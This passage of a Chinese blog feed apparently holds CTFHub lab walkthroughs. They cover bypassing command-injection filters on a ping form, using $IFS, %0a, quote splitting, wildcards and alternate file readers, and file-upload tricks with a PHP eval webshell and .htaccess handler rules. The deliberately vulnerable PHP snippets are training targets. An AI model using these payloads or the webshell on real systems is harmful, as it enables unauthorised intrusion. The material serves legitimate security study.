src="https://img-blog.csdnimg.cn/20201211104639881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>蚁剑连接成功<br><img src="https://img-blog.csdnimg.cn/20201211104731952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="命令注入-过滤cat"><a href="#命令注入-过滤cat" class="headerlink" title="命令注入-过滤cat"></a>命令注入-过滤cat</h2><p>题目描述：过滤了cat命令之后，你还有什么方法能读到 Flag?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/cat/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        exec(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?ip=|ls</span><br></pre></td></tr></table></figure><p>发现了flag_22422157929595.php<br><img src="https://img-blog.csdnimg.cn/20201211110314508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>题目说过滤了cat，绕过cat</p><ol><li> 单引号或双引号绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=|ca<span class="string">&#x27;&#x27;</span>t flag_22422157929595.php</span><br><span class="line">?ip=|ca<span class="string">&quot;&quot;</span>t  flag_22422157929595.php</span><br></pre></td></tr></table></figure></li><li>反斜杠绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=|ca\t  flag_22422157929595.php</span><br></pre></td></tr></table></figure></li><li>利用Shell 特殊变量绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=|ca<span class="variable">$@t</span>  flag_22422157929595.php</span><br><span class="line">?ip=|ca<span class="variable">$1t</span>  flag_22422157929595.php</span><br></pre></td></tr></table></figure></li><li>linux中直接查看文件内容的命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat、tac、more、less、head、tail、file -f、nl、sed、sort、uniq</span><br><span class="line"></span><br><span class="line">cat： 由第一行开始显示档案内容</span><br><span class="line">tac： 从最后一行开始显示，可以看出 tac 是 cat 的反向显示！</span><br><span class="line">nl： 显示的时候，随便输出行号！</span><br><span class="line">more： 一页一页的显示档案内容</span><br><span class="line">less 与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页！</span><br><span class="line">head： 查看头几行</span><br><span class="line">tail： 查看尾几行</span><br><span class="line">od： 以二进制的方式读取档案内容！</span><br><span class="line">最常使用的显示档案内容的指令可以说是 cat ，more 及 less 了！</span><br></pre></td></tr></table></figure></li></ol><p>   cat被过滤了，可以使用其他命令，花式Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?ip=|tac flag_22422157929595.php</span><br><span class="line">?ip=|more flag_22422157929595.php</span><br><span class="line">?ip=|less flag_22422157929595.php</span><br><span class="line">?ip=|head flag_22422157929595.php</span><br><span class="line">?ip=|tail flag_22422157929595.php</span><br><span class="line">?ip=|file -f flag_22422157929595.php</span><br><span class="line">?ip=|nl flag_22422157929595.php</span><br><span class="line">?ip=|sed flag_22422157929595.php</span><br><span class="line">?ip=|sort flag_22422157929595.php</span><br><span class="line">?ip=|uniq flag_22422157929595.php</span><br></pre></td></tr></table></figure><h2 id="命令注入-过滤空格"><a href="#命令注入-过滤空格" class="headerlink" title="命令注入-过滤空格"></a>命令注入-过滤空格</h2><p>题目描述：这次过滤了空格，你能绕过吗</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        exec(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先查询目录结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?ip=|ls</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116153811306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看flag文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?ip=|cat flag_177172732728132.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116154101457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>空格被过滤了，用以下字符代替空格：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; 、&lt;&gt;、%<span class="number">20</span>(space)、%<span class="number">09</span>(tab)、$IFS$<span class="number">9</span>、 $&#123;IFS&#125;、<span class="variable">$IFS</span>  </span><br></pre></td></tr></table></figure><p>新的Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=|cat<span class="variable">$&#123;IFS&#125;</span>flag_177172732728132.php</span><br></pre></td></tr></table></figure><p>查看源代码即可得到flag</p><h2 id="命令注入-过滤目录分隔符"><a href="#命令注入-过滤目录分隔符" class="headerlink" title="命令注入-过滤目录分隔符"></a>命令注入-过滤目录分隔符</h2><p>题目描述：这次过滤了目录分割符 / ，你能读到 flag 目录下的 flag 文件吗</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/\//&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        exec(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>老规矩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?ip=|ls</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116134511443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一些命令分隔符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux中：%<span class="number">0</span>a 、%<span class="number">0</span>d 、; 、&amp; 、| 、&amp;&amp;、||</span><br><span class="line">windows中：%<span class="number">0</span>a、&amp;、|、%<span class="number">1</span>a（一个神奇的角色，作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure><p>由于过滤了目录分隔符 <code>/</code>  ，需要切换到相应目录，并使用 <code>;</code> 分隔符连续执行指令　</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=;<span class="built_in">cd</span> flag_is_here;ls</span><br></pre></td></tr></table></figure><p>cd  进入flag_is_here目录，ls  显示flag_is_here目录里的内容。<br><img src="https://img-blog.csdnimg.cn/20210116134947994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看flag文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?ip=;<span class="built_in">cd</span> flag_is_here;cat flag_3708221509571.php</span><br></pre></td></tr></table></figure><p>查看源代码，拿到flag<br><img src="https://img-blog.csdnimg.cn/20210116135639397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="命令注入-过滤运算符"><a href="#命令注入-过滤运算符" class="headerlink" title="命令注入-过滤运算符"></a>命令注入-过滤运算符</h2><p>题目描述：过滤了几个运算符, 要怎么绕过呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/(\||\&amp;)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        exec(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从代码中，可以看出过滤了 <code>|</code> 与 <code>&amp;</code>运算符 ，那我们就使用 <code>;</code> 分隔符绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?ip=;ls</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116140338276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=;cat flag_64982941521735.php</span><br></pre></td></tr></table></figure><p>查看源代码<br><img src="https://img-blog.csdnimg.cn/20210116140509312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h2><p>题目描述：同时过滤了前面几个小节的内容, 如何打出漂亮的组合拳呢?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        exec(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计代码，发现过滤了<code>|、&amp;、;、空格、/、cat</code>，以及<code>flag和ctfhub</code>等关键字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.查看目录结构：</span><br><span class="line">源命令：|ls</span><br><span class="line"><span class="comment">#%0a代替运算符|</span></span><br><span class="line">Payload:?ip=%0als</span><br><span class="line"></span><br><span class="line">2.查看flag_is_here文件夹下的文件</span><br><span class="line">源命令：;<span class="built_in">cd</span> flag_is_here;ls</span><br><span class="line"><span class="comment">#%0a绕过运算符和;</span></span><br><span class="line"><span class="comment">#$&#123;IFS&#125;代替空格</span></span><br><span class="line"><span class="comment">#flag被过滤了，使用通配符*绕过</span></span><br><span class="line">Payload:?ip=%0acd<span class="variable">$&#123;IFS&#125;</span>*_is_here%0als</span><br><span class="line"></span><br><span class="line">3.查看flag文件内容</span><br><span class="line">源命令：?ip=;<span class="built_in">cd</span> flag_is_here;cat flag_216371105627974.php</span><br><span class="line"><span class="comment">#使用more代替cat</span></span><br><span class="line">Payload:?ip=%0acd<span class="variable">$&#123;IFS&#125;</span>*_is_here%0amore%09*_216371105627974.php </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：CTFHub靶场通关（四）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="CTFhub" scheme="https://swhat.github.io/tags/CTFhub/"/>
    
    <category term="命令执行" scheme="https://swhat.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>线下AWD攻防赛总结</title>
    <link href="https://swhat.github.io/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
    <id>https://swhat.github.io/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/</id>
    <published>2021-01-16T04:03:43.000Z</published>
    <updated>2021-03-27T03:50:41.660Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码不正确。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="85a337800a00338160648ccf3d601fd4fd1071a1c79b9b681e11fd893f4caeaf"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">password</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码查看文章</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    
    <category term="AWD" scheme="https://swhat.github.io/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-Web-文件上传练习</title>
    <link href="https://swhat.github.io/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/"/>
    <id>https://swhat.github.io/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/</id>
    <published>2020-11-22T11:46:56.000Z</published>
    <updated>2021-04-04T14:02:23.418Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（三）</p> <a id="more"></a><h2 id="0x00-无验证"><a href="#0x00-无验证" class="headerlink" title="0x00 无验证"></a>0x00 无验证</h2><p><img src="https://img-blog.csdnimg.cn/2020111821051990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>]);<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>上传文件相对路径<code>upload/1.php</code><br><img src="https://img-blog.csdnimg.cn/20201118210615644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用蚁剑连接，连接密码为<code>pass</code><br><img src="https://img-blog.csdnimg.cn/20201118210744773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看目录，flag就在这里<br><img src="https://img-blog.csdnimg.cn/20201118210930972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x01-前端验证"><a href="#0x01-前端验证" class="headerlink" title="0x01 前端验证"></a>0x01 前端验证</h2><p><img src="https://img-blog.csdnimg.cn/20201118211350400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马，结果提示该文件不允许上传<br><img src="https://img-blog.csdnimg.cn/2020111821132240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>题目是前端验证，直接查看网页源代码，发现只能上传<code>.jpg</code>,<code>.png</code>,<code>.gif</code>三种格式的文件<br><img src="https://img-blog.csdnimg.cn/20201118211703499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>把1.php改为1.jpg，然后上传抓包</p><p><img src="https://img-blog.csdnimg.cn/20201118212718468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>1.jpg再改为1.php，然后放包<br><img src="https://img-blog.csdnimg.cn/20201118213046598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功，得到相对路径upload/1.php<br><img src="https://img-blog.csdnimg.cn/2020111821314576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还是一样的操作，蚁剑连接，查找目录，找到flag<br><img src="https://img-blog.csdnimg.cn/20201118213340365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x03-htaccess"><a href="#0x03-htaccess" class="headerlink" title="0x03 .htaccess"></a>0x03 .htaccess</h2><p>题目描述：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p><p>访问<br><img src="https://img-blog.csdnimg.cn/2020111822095844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源代码，发现文件后缀都被禁用了<br><img src="https://img-blog.csdnimg.cn/2020111822110957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>百度一下hatccess文件，<code>.htaccess</code>是Apache的又一特色。一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件）</p><p><code>.hatccess</code>文件有两种写法</p><p><strong>第一种方法:</strong><br>下面代码的意思是，只要文件名中包含pass，就会被Apache解析为php文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;pass&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>提示文件名不能为空，命名为<code>3.hatccess</code>,用bp抓包，将3.htaccess改为<code>.htaccass</code>，然后放包<br><img src="https://img-blog.csdnimg.cn/2020111912484428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><code>.htaccass</code>文件上传成功<br><img src="https://img-blog.csdnimg.cn/20201119124911563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>把上面用到的1.php改为3.pass文件，上传文件相对路径<code>upload/3.pass</code><br><img 